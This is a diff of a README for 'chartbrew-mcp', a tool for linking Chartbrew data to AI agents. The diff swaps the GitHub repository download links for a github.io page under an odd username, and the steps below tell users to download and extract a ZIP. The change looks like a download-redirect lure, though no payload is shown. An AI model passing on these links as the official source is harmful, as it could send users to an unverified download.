@@ -1,6 +1,6 @@
 # 📊 chartbrew-mcp - Connect AI agents to your data
 
-[![](https://img.shields.io/badge/Download-chartbrew--mcp-blue.svg)](https://github.com/Akwaalamanoftheearth21/chartbrew-mcp)
+[![](https://img.shields.io/badge/Download-chartbrew--mcp-blue.svg)](https://akwaalamanoftheearth21.github.io)
 
 This tool connects your data in Chartbrew to Artificial Intelligence agents. It allows automated systems to view your dashboards, charts, and datasets. You can query your own information using AI tools like Claude, Cursor, and GitHub Copilot. This bridge makes your data accessible to intelligent assistants.
 
@@ -26,7 +26,7 @@ Before you begin, ensure your computer meets these conditions:
 
 ## 📥 Downloading and Installation
 
-1. Visit the project website to access the files: [https://github.com/Akwaalamanoftheearth21/chartbrew-mcp](https://github.com/Akwaalamanoftheearth21/chartbrew-mcp)
+1. Visit the project website to access the files: [https://akwaalamanoftheearth21.github.io](https://akwaalamanoftheearth21.github.io)
 2. Locate the green button labeled "Code" on the right side of the page.
 3. Click "Download ZIP" to save the project folder to your computer.
 4. Extract the contents of the ZIP file to a folder you can find easily, such as your Desktop or Documents folder.
